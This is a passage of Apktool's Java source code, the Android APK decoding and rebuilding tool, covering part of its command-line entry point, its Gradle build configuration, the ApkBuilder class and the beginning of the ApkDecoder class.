        }
        if (cli.hasOption(frameDirOption)) {
            config.setFrameworkDirectory(cli.getOptionValue(frameDirOption));
        }
        if (cli.hasOption(libOption)) {
            config.setLibraryFiles(cli.getOptionValues(libOption));
        }
        if (cli.hasOption(buildForceOption)) {
            config.setForced(true);
        }
        if (cli.hasOption(buildNoApkOption)) {
            config.setNoApk(true);
        }
        if (cli.hasOption(buildNoCrunchOption)) {
            config.setNoCrunch(true);
        }
        if (cli.hasOption(buildCopyOriginalOption)) {
            config.setCopyOriginal(true);
        }
        if (cli.hasOption(buildDebuggableOption)) {
            config.setDebuggable(true);
        }
        if (cli.hasOption(buildNetSecConfOption)) {
            config.setNetSecConf(true);
        }
        if (cli.hasOption(buildAaptOption)) {
            try {
                String aaptBinary = cli.getOptionValue(buildAaptOption);
                if (AaptManager.getBinaryVersion(new File(aaptBinary)) == 1) {
                    throw new AndrolibException("Legacy aapt is no longer supported.");
                }

                config.setAaptBinary(aaptBinary);
            } catch (AndrolibException ex) {
                System.err.println(ex.getMessage());
                System.exit(1);
                return;
            }
        }

        File outFile = null;
        if (cli.hasOption(buildOutputOption)) {
            if (cli.hasOption(buildNoApkOption)) {
                printOptionConflict(buildOutputOption, buildNoApkOption);
            } else {
                outFile = new File(cli.getOptionValue(buildOutputOption));
            }
        }

        new ApkBuilder(new File(apkDirName), config).build(outFile);
    }

    private static void cmdInstallFramework(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(installFrameworkOptions, args);
        List<String> argList = cli.getArgList();
        String apkName;
        switch (argList.size()) {
            case 0:
                System.err.println("Input apk file was not specified.");
                System.exit(1);
                return;
            case 1:
                apkName = argList.get(0);
                break;
            default:
                System.err.println("Invalid arguments.");
                printUsage();
                System.exit(1);
                return;
        }

        if (cli.hasOption(frameFrameDirOption)) {
            config.setFrameworkDirectory(cli.getOptionValue(frameFrameDirOption));
        }
        if (cli.hasOption(frameFrameTagOption)) {
            config.setFrameworkTag(cli.getOptionValue(frameFrameTagOption));
        }

        new Framework(config).install(new File(apkName));
    }

    private static void cmdCleanFrameworks(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(cleanFrameworksOptions, args);
        List<String> argList = cli.getArgList();
        if (!argList.isEmpty()) {
            System.err.println("Invalid arguments.");
            printUsage();
            System.exit(1);
            return;
        }

        if (cli.hasOption(frameFrameDirOption)) {
            config.setFrameworkDirectory(cli.getOptionValue(frameFrameDirOption));
        }
        if (cli.hasOption(frameFrameTagOption)) {
            config.setFrameworkTag(cli.getOptionValue(frameFrameTagOption));
        }
        if (cli.hasOption(frameForceAllOption)) {
            if (cli.hasOption(frameFrameTagOption)) {
                printOptionConflict(frameForceAllOption, frameFrameTagOption);
            } else {
                config.setForced(true);
            }
        }

        new Framework(config).cleanDirectory();
    }

    private static void cmdListFrameworks(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(listFrameworksOptions, args);
        List<String> argList = cli.getArgList();
        if (!argList.isEmpty()) {
            System.err.println("Invalid arguments.");
            printUsage();
            System.exit(1);
            return;
        }

        if (cli.hasOption(frameFrameDirOption)) {
            config.setFrameworkDirectory(cli.getOptionValue(frameFrameDirOption));
        }
        if (cli.hasOption(frameFrameTagOption)) {
            config.setFrameworkTag(cli.getOptionValue(frameFrameTagOption));
        }
        if (cli.hasOption(frameForceAllOption)) {
            if (cli.hasOption(frameFrameTagOption)) {
                printOptionConflict(frameForceAllOption, frameFrameTagOption);
            } else {
                config.setForced(true);
            }
        }

        for (File file : new Framework(config).listDirectory()) {
            System.out.println(file.getName());
        }
    }

    private static void cmdPublicizeResources(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(publicizeResourcesOptions, args);
        List<String> argList = cli.getArgList();
        String arscName;
        switch (argList.size()) {
            case 0:
                System.err.println("Input arsc file was not specified.");
                System.exit(1);
                return;
            case 1:
                arscName = argList.get(0);
                break;
            default:
                System.err.println("Invalid arguments.");
                printUsage();
                System.exit(1);
                return;
        }

        new Framework(config).publicizeResources(new File(arscName));
    }

    private static void printOptionConflict(Option option, Option conflict) {
        System.err.println("Ignoring " + formatOption(option) + " (cannot be used with " + formatOption(conflict) + ")");
    }

    private static String formatOption(Option option) {
        StringBuilder sb = new StringBuilder();
        String shortName = option.getOpt();
        if (shortName != null) {
            sb.append('-').append(shortName);
        }
        String longName = option.getLongOpt();
        if (longName != null) {
            if (sb.length() > 0) {
                sb.append('/');
            }
            sb.append("--").append(longName);
        }
        return sb.toString();
    }

    @SuppressWarnings("deprecation")
    private static void printUsage() {
        PrintWriter writer = new PrintWriter(System.out);
        HelpFormatter formatter = new HelpFormatter();

        // Print header.
        writer.println("Apktool " + props.getVersion() + " - a tool for reengineering Android apk files");
        writer.println("with smali " + props.getSmaliVersion() + " and baksmali " + props.getBaksmaliVersion());
        writer.println("Copyright 2010 Ryszard Wiśniewski <brut.alll@gmail.com>");
        writer.println("Copyright 2010 Connor Tumbleson <connor.tumbleson@gmail.com>");
        if (advancedMode) {
            writer.println("Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0)");
        }
        writer.println();

        // Print usages.
        writer.println("General options:");
        printOptions(writer, formatter, generalOptions);
        writer.println();
        if (loadedOptions == null || loadedOptions == decodeOptions) {
            writer.println("apktool d|decode [options] <apk-file>");
            printOptions(writer, formatter, decodeOptions);
            writer.println();
        }
        if (loadedOptions == null || loadedOptions == buildOptions) {
            writer.println("apktool b|build [options] <apk-dir>");
            printOptions(writer, formatter, buildOptions);
            writer.println();
        }
        if (loadedOptions == null || loadedOptions == installFrameworkOptions) {
            writer.println("apktool if|install-framework [options] <apk-file>");
            printOptions(writer, formatter, installFrameworkOptions);
            writer.println();
        }
        if ((advancedMode && loadedOptions == null) || loadedOptions == cleanFrameworksOptions) {
            writer.println("apktool cf|clean-frameworks [options]");
            printOptions(writer, formatter, cleanFrameworksOptions);
            writer.println();
        }
        if ((advancedMode && loadedOptions == null) || loadedOptions == listFrameworksOptions) {
            writer.println("apktool lf|list-frameworks [options]");
            printOptions(writer, formatter, listFrameworksOptions);
            writer.println();
        }
        if ((advancedMode && loadedOptions == null) || loadedOptions == publicizeResourcesOptions) {
            writer.println("apktool pr|publicize-resources <arsc-file>");
            printOptions(writer, formatter, publicizeResourcesOptions);
            writer.println();
        }
        if (loadedOptions == null) {
            writer.println("apktool h|help");
            writer.println();
            writer.println("apktool v|version");
            writer.println();
        }

        // Print footer.
        writer.println("For additional info, see: https://apktool.org");
        writer.println("For smali/baksmali info, see: https://github.com/google/smali");

        writer.flush();
    }

    @SuppressWarnings("deprecation")
    private static void printOptions(PrintWriter writer, HelpFormatter formatter, Options options) {
        final int width = 120;
        final int leftPadding = 1;
        final int descPadding = 3;

        if (!options.getOptions().isEmpty()) {
            formatter.printOptions(writer, width, options, leftPadding, descPadding);
        }
    }

    private static void printVersion() {
        System.out.println(props.getVersion());
    }

    private static void setupLogging(Verbosity verbosity) {
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger("");

        if (verbosity == Verbosity.QUIET) {
            logger.setLevel(Level.OFF);
            return;
        }

        Handler handler = new Handler() {
            @Override
            public void publish(LogRecord record) {
                if (!isLoggable(record)) {
                    return;
                }
                try {
                    String message = getFormatter().format(record);
                    int level = record.getLevel().intValue();
                    if (level >= Level.WARNING.intValue()) {
                        System.err.println(message);
                    } else {
                        System.out.println(message);
                    }
                } catch (Exception ex) {
                    reportError(null, ex, ErrorManager.FORMAT_FAILURE);
                }
            }

            @Override
            public void flush() {
                System.out.flush();
                System.err.flush();
            }

            @Override
            public void close() throws SecurityException {
                flush();
            }
        };
        handler.setFormatter(new Formatter() {
            @Override
            public String format(LogRecord record) {
                String prefix;
                int level = record.getLevel().intValue();
                if (level >= Level.SEVERE.intValue()) {
                    prefix = "E";
                } else if (level >= Level.WARNING.intValue()) {
                    prefix = "W";
                } else if (level >= Level.INFO.intValue()) {
                    prefix = "I";
                } else {
                    prefix = "D";
                }
                return prefix + ": " + record.getMessage();
            }
        });
        logger.addHandler(handler);
        logger.setLevel(verbosity == Verbosity.VERBOSE ? Level.ALL : Level.INFO);
    }

    private static class Props extends Properties {

        public Props() {
            load(this, "/apktool.properties");

            Properties smaliProps = new Properties();
            load(smaliProps, "/smali.properties");
            String smaliVersion = smaliProps.getProperty("application.version", "");
            if (!smaliVersion.isEmpty()) {
                put("smali.version", smaliVersion);
            }

            Properties baksmaliProps = new Properties();
            load(baksmaliProps, "/baksmali.properties");
            String baksmaliVersion = baksmaliProps.getProperty("application.version", "");
            if (!baksmaliVersion.isEmpty()) {
                put("baksmali.version", baksmaliVersion);
            }
        }

        public String getVersion() {
            return getProperty("application.version", "(unknown)");
        }

        public String getSmaliVersion() {
            return getProperty("smali.version", "(unknown)");
        }

        public String getBaksmaliVersion() {
            return getProperty("baksmali.version", "(unknown)");
        }

        private void load(Properties props, String name) {
            try (InputStream in = Main.class.getResourceAsStream(name)) {
                if (in == null) {
                    throw new FileNotFoundException(name);
                }
                props.load(in);
            } catch (IOException ignored) {
                System.err.println("Could not load resource: " + name);
            }
        }
    }
}

```

`brut.apktool/apktool-cli/src/main/resources/apktool.properties`:

```properties
application.version=${version}
git.commit.id.abbrev=${gitrev}

```

`brut.apktool/apktool-lib/build.gradle.kts`:

```kts
dependencies {
    api(project(":brut.j.common"))
    api(project(":brut.j.util"))
    api(project(":brut.j.dir"))
    api(project(":brut.j.xml"))
    api(project(":brut.j.yaml"))

    implementation(libs.baksmali)
    implementation(libs.smali)
    implementation(libs.guava)
    implementation(libs.commons.lang3)
    implementation(libs.commons.io)
    implementation(libs.commons.text)

    testImplementation(libs.junit)
    testImplementation(libs.xmlunit)
}

tasks {
    processResources {
        from("src/main/resources") {
            include("**/*.jar")
            duplicatesStrategy = DuplicatesStrategy.INCLUDE
        }
        includeEmptyDirs = false
    }

    test {
        // https://github.com/iBotPeaches/Apktool/issues/3174 - CVE-2023-22036
        // Increases validation of extra field of zip header. Some older Android apps
        // used this field to store data violating the zip specification.
        systemProperty("jdk.util.zip.disableZip64ExtraFieldValidation", true)

        // Fix for AWT/X11 graphics environment issues in headless environments
        // Required for tests that use ImageIO operations (nine-patch processing, etc.)
        systemProperty("java.awt.headless", true)
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/ApkBuilder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.meta.ApkInfo;
import brut.androlib.meta.SdkInfo;
import brut.androlib.res.AaptInvoker;
import brut.androlib.res.AaptManager;
import brut.androlib.res.data.ResChunkHeader;
import brut.androlib.res.table.ResConfig;
import brut.androlib.res.xml.ResXmlUtils;
import brut.androlib.smali.SmaliBuilder;
import brut.common.BrutException;
import brut.common.Log;
import brut.directory.Directory;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import brut.directory.FileDirectory;
import brut.directory.ZipRODirectory;
import brut.util.BackgroundWorker;
import brut.util.BinaryDataInputStream;
import brut.util.BrutIO;
import brut.util.OS;
import brut.util.ZipUtils;

import java.io.*;
import java.nio.file.Files;
import java.util.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.zip.ZipOutputStream;

public class ApkBuilder {
    private static final String TAG = ApkBuilder.class.getName();

    private final ExtFile mApkDir;
    private final Config mConfig;
    private final AtomicReference<AndrolibException> mFirstError;

    private ApkInfo mApkInfo;
    private SmaliBuilder mSmaliBuilder;
    private AaptInvoker mAaptInvoker;
    private BackgroundWorker mWorker;

    public ApkBuilder(File apkDir, Config config) {
        mApkDir = new ExtFile(apkDir);
        mConfig = config;
        mFirstError = new AtomicReference<>();
    }

    public void build(File outApk) throws AndrolibException {
        if (mConfig.getJobs() > 1) {
            mWorker = new BackgroundWorker(mConfig.getJobs() - 1);
        }
        try {
            mApkInfo = ApkInfo.load(mApkDir);
            String minSdkVersion = mApkInfo.getSdkInfo().getMinSdkVersion();
            mSmaliBuilder = new SmaliBuilder(minSdkVersion != null ? SdkInfo.parseSdkInt(minSdkVersion) : 0);
            mAaptInvoker = new AaptInvoker(mApkInfo, mConfig);

            String apkName = mApkInfo.getApkFileName();
            if (apkName == null) {
                apkName = "out.apk";
            }
            if (mConfig.isNoApk()) {
                outApk = null;
            } else if (outApk == null) {
                outApk = new File(mApkDir, "dist/" + apkName);
            }

            File outDir = new File(mApkDir, "build/apk");
            OS.mkdir(outDir);

            Log.i(TAG, "Using Apktool " + mConfig.getVersion() + " on " + apkName
                     + (mWorker != null ? " with " + mConfig.getJobs() + " threads" : ""));

            buildSources(outDir);
            buildResources(outDir);

            if (mWorker != null) {
                mWorker.waitForFinish();
                if (mFirstError.get() != null) {
                    throw mFirstError.get();
                }
            }

            copyOriginalFiles(outDir);
            if (outApk != null) {
                buildApkFile(outDir, outApk);
            }
        } finally {
            if (mWorker != null) {
                mWorker.shutdownNow();
            }
        }
    }

    private void buildSources(File outDir) throws AndrolibException {
        try {
            Directory in = mApkDir.getDirectory();

            // Copy raw dex files.
            Set<String> dexFiles = new HashSet<>();
            for (String fileName : in.getFiles()) {
                if (fileName.endsWith(".dex")) {
                    copySourcesRaw(outDir, fileName);
                    dexFiles.add(fileName);
                }
            }

            // Build smali dirs.
            for (String dirName : in.getDirs().keySet()) {
                String fileName;
                if (dirName.equals("smali")) {
                    fileName = "classes.dex";
                } else if (dirName.startsWith("smali_")) {
                    fileName = dirName.substring(dirName.indexOf('_') + 1).replace('@', File.separatorChar) + ".dex";
                } else {
                    continue;
                }

                if (!dexFiles.contains(fileName)) {
                    buildSourcesSmali(outDir, dirName, fileName);
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copySourcesRaw(File outDir, String fileName) throws AndrolibException {
        File inFile = new File(mApkDir, fileName);
        File outFile = new File(outDir, fileName);

        if (!mConfig.isForced() && !isFileNewer(inFile, outFile)) {
            Log.i(TAG, fileName + " has not changed.");
            return;
        }

        Log.i(TAG, "Copying raw " + fileName + "...");
        try {
            BrutIO.copyAndClose(Files.newInputStream(inFile.toPath()), Files.newOutputStream(outFile.toPath()));
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void buildSourcesSmali(File outDir, String dirName, String fileName) throws AndrolibException {
        if (mWorker != null) {
            mWorker.submit(() -> {
                if (mFirstError.get() == null) {
                    try {
                        buildSourcesSmaliJob(outDir, dirName, fileName);
                    } catch (AndrolibException ex) {
                        mFirstError.compareAndSet(null, ex);
                    }
                }
            });
        } else {
            buildSourcesSmaliJob(outDir, dirName, fileName);
        }
    }

    private void buildSourcesSmaliJob(File outDir, String dirName, String fileName) throws AndrolibException {
        File smaliDir = new File(mApkDir, dirName);
        File dexFile = new File(outDir, fileName);

        if (!mConfig.isForced() && !isFileNewer(smaliDir, dexFile)) {
            Log.i(TAG, dirName + " has not changed.");
            return;
        }

        Log.i(TAG, "Smaling " + dirName + " folder into " + fileName + "...");
        mSmaliBuilder.build(smaliDir, dexFile);
    }

    private void buildResources(File outDir) throws AndrolibException {
        File manifest = new File(mApkDir, "AndroidManifest.xml");
        if (!manifest.isFile()) {
            return;
        }

        // Check if manifest is binary XML.
        boolean isBinaryManifest;
        try (BinaryDataInputStream in = new BinaryDataInputStream(Files.newInputStream(manifest.toPath()))) {
            isBinaryManifest = ResChunkHeader.read(in).type == ResChunkHeader.RES_XML_TYPE;
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }

        // Copy raw manifest if it's binary XML.
        if (isBinaryManifest) {
            copyManifestRaw(outDir, manifest);
        }

        // Copy raw resources if possible.
        File arscFile = new File(mApkDir, "resources.arsc");
        if (arscFile.isFile()) {
            copyResourcesRaw(outDir, arscFile);
            return;
        }

        // We cannot build if manifest is binary XML.
        if (isBinaryManifest) {
            return;
        }

        // Build only manifest if no resources.
        File resDir = new File(mApkDir, "res");
        if (!resDir.isDirectory()) {
            buildManifestOnly(outDir, manifest);
            return;
        }

        // Build manifest and resources.
        buildResourcesFully(outDir, manifest, resDir);
    }

    private void copyManifestRaw(File outDir, File manifest) throws AndrolibException {
        if (!mConfig.isForced() && !isFileNewer(manifest, new File(outDir, "AndroidManifest.xml"))) {
            Log.i(TAG, "AndroidManifest.xml has not changed.");
            return;
        }

        Log.i(TAG, "Copying raw AndroidManifest.xml...");
        try {
            Directory in = mApkDir.getDirectory();

            in.copyToDir(outDir, "AndroidManifest.xml");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copyResourcesRaw(File outDir, File arscFile) throws AndrolibException {
        if (!mConfig.isForced() && !isFileNewer(arscFile, new File(outDir, "resources.arsc"))) {
            Log.i(TAG, "resources.arsc has not changed.");
            return;
        }

        Log.i(TAG, "Copying raw resources.arsc...");
        try {
            Directory in = mApkDir.getDirectory();

            in.copyToDir(outDir, "resources.arsc");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void buildManifestOnly(File outDir, File manifest) throws AndrolibException {
        if (!mConfig.isForced() && !isFileNewer(manifest, new File(outDir, "AndroidManifest.xml"))) {
            Log.i(TAG, "AndroidManifest.xml has not changed.");
            return;
        }

        // Back up manifest for editing.
        File manifestOrig = new File(manifest.getPath() + ".orig");
        try {
            OS.cpfile(manifest, manifestOrig);
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }

        ResXmlUtils.fixingPublicAttrsInProviderAttributes(manifest);

        if (mConfig.isDebuggable()) {
            Log.i(TAG, "Setting 'debuggable' attribute to 'true' in AndroidManifest.xml...");
            ResXmlUtils.setApplicationDebugTagTrue(manifest);
        }

        File tmpFile;
        try {
            tmpFile = File.createTempFile("APKTOOL", null);
            OS.rmfile(tmpFile);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }

        Log.i(TAG, "Building AndroidManifest.xml with " + AaptManager.getBinaryName() + "...");
        mAaptInvoker.invoke(tmpFile, manifest, null);

        try (ZipRODirectory tmpDir = new ZipRODirectory(tmpFile)) {
            tmpDir.copyToDir(outDir, "AndroidManifest.xml");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        } finally {
            OS.rmfile(tmpFile);
        }

        // Restore original manifest.
        try {
            OS.mvfile(manifestOrig, manifest);
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void buildResourcesFully(File outDir, File manifest, File resDir) throws AndrolibException {
        if (!mConfig.isForced() && !isFileNewer(manifest, new File(outDir, "AndroidManifest.xml"))
                && !isFileNewer(resDir, new File(outDir, "res"))) {
            Log.i(TAG, "AndroidManifest.xml and resources have not changed.");
            return;
        }

        // Back up manifest for editing.
        File manifestOrig = new File(manifest.getPath() + ".orig");
        try {
            OS.cpfile(manifest, manifestOrig);
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }

        ResXmlUtils.fixingPublicAttrsInProviderAttributes(manifest);

        if (mConfig.isDebuggable()) {
            Log.i(TAG, "Setting 'debuggable' attribute to 'true' in AndroidManifest.xml...");
            ResXmlUtils.setApplicationDebugTagTrue(manifest);
        }

        if (mConfig.isNetSecConf()) {
            Log.i(TAG, "Adding permissive network security config in manifest...");
            File netSecConfOrig = new File(mApkDir, "res/xml/network_security_config.xml");
            OS.mkdir(netSecConfOrig.getParentFile());
            ResXmlUtils.modNetworkSecurityConfig(netSecConfOrig);
            ResXmlUtils.setNetworkSecurityConfig(manifest);

            String targetSdkVersion = mApkInfo.getSdkInfo().getTargetSdkVersion();
            if (targetSdkVersion != null && SdkInfo.parseSdkInt(targetSdkVersion) < ResConfig.SDK_NOUGAT) {
                Log.w(TAG, "Target SDK version is lower than 24, Network Security Configuration might be ignored!");
            }
        }

        File tmpFile;
        try {
            tmpFile = File.createTempFile("APKTOOL", null);
            OS.rmfile(tmpFile);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }

        Log.i(TAG, "Building resources with " + AaptManager.getBinaryName() + "...");
        mAaptInvoker.invoke(tmpFile, manifest, resDir);

        try (ZipRODirectory tmpDir = new ZipRODirectory(tmpFile)) {
            tmpDir.copyToDir(outDir, "AndroidManifest.xml", "resources.arsc", "res");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        } finally {
            OS.rmfile(tmpFile);
        }

        // Restore original manifest.
        try {
            OS.mvfile(manifestOrig, manifest);
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copyOriginalFiles(File outDir) throws AndrolibException {
        if (!mConfig.isCopyOriginal()) {
            return;
        }

        File originalDir = new File(mApkDir, "original");
        if (!originalDir.isDirectory()) {
            return;
        }

        Log.i(TAG, "Copying original files...");
        try {
            FileDirectory in = new FileDirectory(originalDir);

            for (String fileName : in.getFiles(true)) {
                if (ApkInfo.ORIGINAL_FILES_PATTERN.matcher(fileName).matches()) {
                    in.copyToDir(outDir, fileName);
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void buildApkFile(File outDir, File outApk) throws AndrolibException {
        if (outApk.exists()) {
            OS.rmfile(outApk);
        } else {
            File parentDir = outApk.getParentFile();
            if (parentDir != null) {
                OS.mkdir(parentDir);
            }
        }

        // Convert to set for fast lookup.
        Set<String> doNotCompress = new HashSet<>(mApkInfo.getDoNotCompress());

        Log.i(TAG, "Building apk file...");
        try (ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(outApk.toPath()))) {
            // Zip aapt output files.
            ZipUtils.zipDir(outDir, out, doNotCompress);

            // Zip standard raw files.
            for (String dirName : ApkInfo.RAW_DIRS) {
                File rawDir = new File(mApkDir, dirName);
                if (rawDir.isDirectory()) {
                    Log.i(TAG, "Importing " + dirName + "...");
                    ZipUtils.zipDir(mApkDir, dirName, out, doNotCompress);
                }
            }

            // Zip unknown files.
            File unknownDir = new File(mApkDir, "unknown");
            if (unknownDir.isDirectory()) {
                Log.i(TAG, "Importing unknown files...");
                ZipUtils.zipDir(unknownDir, out, doNotCompress);
            }
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
        Log.i(TAG, "Built apk into: " + outApk.getPath());
    }

    private boolean isFileNewer(File file, File reference) {
        return !reference.exists() || BrutIO.recursiveModifiedTime(file) > BrutIO.recursiveModifiedTime(reference);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/ApkDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.InFileNotFoundException;
import brut.androlib.exceptions.OutDirExistsException;
import brut.androlib.meta.ApkInfo;
import brut.androlib.res.ResDecoder;
import brut.androlib.smali.SmaliDecoder;
import brut.common.Log;
import brut.directory.Directory;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import brut.util.BackgroundWorker;
import brut.util.OS;
import com.google.common.annotations.VisibleForTesting;
import org.apache.commons.io.FilenameUtils;

import java.io.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

public class ApkDecoder {
    private static final String TAG = ApkDecoder.class.getName();

    private static final Pattern NO_COMPRESS_EXT_PATTERN = Pattern.compile(
        "dex|arsc|so|jpg|jpeg|png|gif|wav|mp2|mp3|ogg|aac|mpg|mpeg|mid|midi|smf|jet|"
      + "rtttl|imy|xmf|mp4|m4a|m4v|3gp|3gpp|3g2|3gpp2|amr|awb|wma|wmv|webm|webp|mkv");

    private final ExtFile mApkFile;
    private final Config mConfig;
    private final AtomicReference<AndrolibException> mFirstError;

    private ApkInfo mApkInfo;
    private SmaliDecoder mSmaliDecoder;
    private ResDecoder mResDecoder;
    private BackgroundWorker mWorker;

    public ApkDecoder(File apkFile, Config config) {
        mApkFile = new ExtFile(apkFile);
        mConfig = config;
        mFirstError = new AtomicReference<>();
    }

    public void decode(File outDir) throws AndrolibException {
        if (!mConfig.isForced() && outDir.exists()) {
            throw new OutDirExistsException(outDir.getPath());
        }
        if (!mApkFile.isFile() || !mApkFile.canRead()) {
            throw new InFileNotFoundException(mApkFile.getPath());
        }
        if (mConfig.getJobs() > 1) {
            mWorker = new BackgroundWorker(mConfig.getJobs() - 1);
        }
        try {
            mApkInfo = new ApkInfo();
            mApkInfo.setVersion(mConfig.getVersion());
            mApkInfo.setApkFile(mApkFile);
            mSmaliDecoder = new SmaliDecoder(mApkFile, mConfig.isBaksmaliDebugMode());
            mResDecoder = new ResDecoder(mApkInfo, mConfig);

            OS.rmdir(outDir);
            OS.mkdir(outDir);

            Log.i(TAG, "Using Apktool " + mConfig.getVersion() + " on " + mApkFile.getName()
                     + (mWorker != null ? " with " + mConfig.getJobs() + " threads" : ""));

            decodeSources(outDir);
            decodeResources(outDir);
            decodeManifest(outDir);

            if (mWorker != null) {
                mWorker.waitForFinish();
                if (mFirstError.get() != null) {
                    throw mFirstError.get();
                }
            }

            copyOriginalFiles(outDir);
            copyRawFiles(outDir);
            copyUnknownFiles(outDir);
            writeApkInfo(outDir);
        } finally {
            if (mWorker != null) {
                mWorker.shutdownNow();
            }
            try {
                mApkFile.close();
            } catch (DirectoryException ignored) {
            }
        }
    }

    @VisibleForTesting
    ApkInfo getApkInfo() {
        return mApkInfo;
    }

    private void decodeSources(File outDir) throws AndrolibException {
        if (!mApkInfo.hasSources()) {
            return;
        }

        try {
            Directory in = mApkFile.getDirectory();
            boolean allSrc = mConfig.isDecodeSourcesFull();
            boolean noSrc = mConfig.isDecodeSourcesNone();

            for (String fileName : in.getFiles(allSrc)) {
                if (allSrc ? !fileName.endsWith(".dex") : !ApkInfo.CLASSES_FILES_PATTERN.matcher(fileName).matches()) {
                    continue;
                }

                if (noSrc) {
                    copySourcesRaw(outDir, fileName);
                } else {
                    decodeSourcesSmali(outDir, fileName);
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copySourcesRaw(File outDir, String fileName) throws AndrolibException {
        Log.i(TAG, "Copying raw " + fileName + "...");
        try {
            Directory in = mApkFile.getDirectory();

            in.copyToDir(outDir, fileName);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void decodeSourcesSmali(File outDir, String fileName) throws AndrolibException {
        if (mWorker != null) {
            mWorker.submit(() -> {
                if (mFirstError.get() == null) {
                    try {
                        decodeSourcesSmaliJob(outDir, fileName);
                    } catch (AndrolibException ex) {
                        mFirstError.compareAndSet(null, ex);
                    }
                }
            });
        } else {
            decodeSourcesSmaliJob(outDir, fileName);
        }
    }

    private void decodeSourcesSmaliJob(File outDir, String fileName) throws AndrolibException {
        Log.i(TAG, "Baksmaling " + fileName + "...");
        mSmaliDecoder.decode(fileName, outDir);
    }

    private void decodeResources(File outDir) throws AndrolibException {
        if (!mApkInfo.hasResources()) {
            return;
        }

        if (mConfig.isDecodeResourcesFull()) {
            mResDecoder.decodeResources(outDir);
        } else {
            copyResourcesRaw(outDir);
        }
    }

    private void copyResourcesRaw(File outDir) throws AndrolibException {
        Log.i(TAG, "Copying raw resources.arsc...");
        try {
            Directory in = mApkFile.getDirectory();

            in.copyToDir(outDir, "resources.arsc");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void decodeManifest(File outDir) throws AndrolibException {
        if (!mApkInfo.hasManifest()) {
            return;
        }

        if (!mConfig.isDecodeResourcesNone()) {
            mResDecoder.decodeManifest(outDir);
        } else {
            copyManifestRaw(outDir);
        }
    }

    private void copyManifestRaw(File outDir) throws AndrolibException {
        Log.i(TAG, "Copying raw AndroidManifest.xml...");
        try {
            Directory in = mApkFile.getDirectory();

            in.copyToDir(outDir, "AndroidManifest.xml");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copyRawFiles(File outDir) throws AndrolibException {
        try {
            Directory in = mApkFile.getDirectory();
            Set<String> dexFiles = mSmaliDecoder.getDexFiles();
            Map<String, String> resFileMap = mResDecoder.getResFileMap();
            boolean noAssets = mConfig.isDecodeAssetsNone();

            for (String dirName : ApkInfo.RAW_DIRS) {
                if (!in.containsDir(dirName) || (noAssets && dirName.equals("assets"))) {
                    continue;
                }

                Log.i(TAG, "Copying " + dirName + "...");
                for (String fileName : in.getDir(dirName).getFiles(true)) {
                    fileName = dirName + in.separator + fileName;
                    if (!ApkInfo.ORIGINAL_FILES_PATTERN.matcher(fileName).matches()
                            && !dexFiles.contains(fileName) && !resFileMap.containsKey(fileName)) {
                        in.copyToDir(outDir, fileName);
                    }
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copyOriginalFiles(File outDir) throws AndrolibException {
        File originalDir = new File(outDir, "original");

        Log.i(TAG, "Copying original files...");
        try {
            Directory in = mApkFile.getDirectory();

            for (String fileName : in.getFiles(true)) {
